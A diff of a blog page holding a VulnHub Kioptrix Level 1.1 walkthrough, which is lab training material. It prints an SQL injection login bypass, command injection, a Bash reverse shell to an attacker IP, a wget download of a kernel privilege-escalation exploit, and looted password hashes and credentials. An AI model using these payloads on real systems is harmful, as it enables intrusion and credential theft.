@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,13 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1.1 (#2)</h1>
-                  <p class="nested"><a href="/posts/20190928_vulnhub-kioptrix1.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190929_vulnhub-kioptrix3.html"> » </a></p>
+                  <p><a href="/posts/20190928_vulnhub-kioptrix1.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190929_vulnhub-kioptrix3.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 1.1 (#2)</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix2/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Fri Sep 27 18:16:48 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix2/results/192.168.92.182/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix2/results/192.168.92.182/scans/xml/_quick_tcp_nmap.xml 192.168.92.182
+<pre class="nested"><code># Nmap 7.70 scan initiated Fri Sep 27 18:16:48 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix2/results/192.168.92.182/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix2/results/192.168.92.182/scans/xml/_quick_tcp_nmap.xml 192.168.92.182
 Nmap scan report for 192.168.92.182
 Host is up, received arp-response (0.0025s latency).
 Scanned at 2019-09-27 18:16:48 PDT for 15s
@@ -168,7 +135,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. We find a login form served at <code>80/tcp</code>. Within HTML comments we find reference to a possible username <code>admin</code> and successfully login using SQL injection:  </p>
-<p class="nested"re><code>admin/' or 1=1 -- -
+<pre class="nested"><code>admin/' or 1=1 -- -
 </code></pre>
 
 <p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot01.png" />  </p>
@@ -177,8 +144,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot03.png" />  </p>
 <p class="nested"><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot04.png" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>22/tcp    |  ssh       |  OpenSSH 3.9p1 (protocol 1.99)
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp    |  ssh       |  OpenSSH 3.9p1 (protocol 1.99)
 80/tcp    |  http      |  Apache httpd 2.0.52 ((CentOS))
 111/tcp   |  rpcbind   |  2 (RPC #100000)
 443/tcp   |  ssl/http  |  Apache httpd 2.0.52 ((CentOS))
@@ -189,19 +156,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We try to inject additional command after the IP using a <code>;</code> as separator and get results back:  </p>
-<p class="nested"re><code>8.8.8.8 ; uname -a
+<pre class="nested"><code>8.8.8.8 ; uname -a
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot05.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot06.png" />  </p>
 <p class="nested">2. We can also run commands without providing the IP which makes it a little faster to get results back:  </p>
-<p class="nested"re><code>; uname -a
+<pre class="nested"><code>; uname -a
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot07.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot08.png" />  </p>
 <p class="nested">3. We try to use Python to get a reverse shell connection but it fails. We fallback on Bash reverse shell and it works:  </p>
-<p class="nested"re><code>nc -nlvp 443
+<pre class="nested"><code>nc -nlvp 443
 ; bash -i &gt;&amp; /dev/tcp/192.168.92.183/443 0&gt;&amp;1
 </code></pre>
 
@@ -209,7 +176,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p class="nested"><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot10.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.3.3" src="/static/files/posts_vulnhub_kioptrix2/screenshot11.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>apache@kioptrix.level2&gt; id
+<pre class="nested"><code>apache@kioptrix.level2&gt; id
 uid=48(apache) gid=48(apache) groups=48(apache)
 apache@kioptrix.level2&gt;  
 apache@kioptrix.level2&gt; uname
@@ -232,13 +199,13 @@ root
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We try the usuals (<code>crontab</code>|<code>setuid</code>|<code>chkrootkit</code>|etc.) but do not find anything interesting. While exploring the current directory, we find that <code>/var/www/html/index.php</code> file has hardcoded MySQL credentials for user <code>john</code>:  </p>
-<p class="nested"re><code>head /var/www/html/index.php
+<pre class="nested"><code>head /var/www/html/index.php
   mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());
 </code></pre>
 
 <p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot12.png" />  </p>
 <p class="nested">2. We find web application password hashes for users <code>admin</code> and <code>john</code> from the <code>users</code> table within <code>webapp</code> database:  </p>
-<p class="nested"re><code>mysql -h localhost -u john -p
+<pre class="nested"><code>mysql -h localhost -u john -p
   show databases;
   use webapp;
   show tables;
@@ -248,17 +215,17 @@ root
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot13.png" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot14.png" />  </p>
 <p class="nested">3. From the <code>/etc/redhat-release</code> file we find that the target system is <code>CentOS release 4.5 (Final)</code>:  </p>
-<p class="nested"re><code>cat /etc/redhat-release
+<pre class="nested"><code>cat /etc/redhat-release
 </code></pre>
 
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot15.png" />  </p>
 <p class="nested">4. We find an exploit for this CentOS release using <code>searchsploit</code>:  </p>
-<p class="nested"re><code>searchsploit linux kernel centos 4.5
+<pre class="nested"><code>searchsploit linux kernel centos 4.5
   Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)  | exploits/linux_x86/local/9542.c
 </code></pre>
 
 <p class="nested">5. We transfer this exploit file to the target system, compile it using <code>gcc</code> and execute it to get elevated access:  </p>
-<p class="nested"re><code>sharehttp 9999
+<pre class="nested"><code>sharehttp 9999
 cd /tmp
 wget http://192.168.92.183:9999/9542.c
 gcc -o 9542 9542.c
@@ -270,13 +237,13 @@ gcc -o 9542 9542.c
 <p class="nested"><img alt="writeup.privesc.steps.5.3" src="/static/files/posts_vulnhub_kioptrix2/screenshot18.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<p class="nested"re><code>root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:............
+<pre class="nested"><code>root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:............
 john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:............
 harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:............
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<p class="nested"re><code>mysql: john/hirosh...
+<pre class="nested"><code>mysql: john/hirosh...
 webapp: admin/5afac8...., john/66lajGG...
 </code></pre>
 
@@ -285,19 +252,17 @@ webapp: admin/5afac8...., john/66lajGG...
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a>  </li>
 <li><a href="https://byte8blog.wordpress.com/2017/03/18/kioptrix-level-2-writeup/">https://byte8blog.wordpress.com/2017/03/18/kioptrix-level-2-writeup/</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20190928_vulnhub-kioptrix1.html">[VulnHub] Kioptrix: Level 1 (#...</a> « | » <a href="/posts/20190929_vulnhub-kioptrix3.html">[VulnHub] Kioptrix: Level 1.2 ...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190928_vulnhub-kioptrix1.html">[VulnHub] Kioptrix: Level 1 (#...</a> « | » <a href="/posts/20190929_vulnhub-kioptrix3.html">[VulnHub] Kioptrix: Level 1.2 ...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -305,6 +270,10 @@ webapp: admin/5afac8...., john/66lajGG...
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
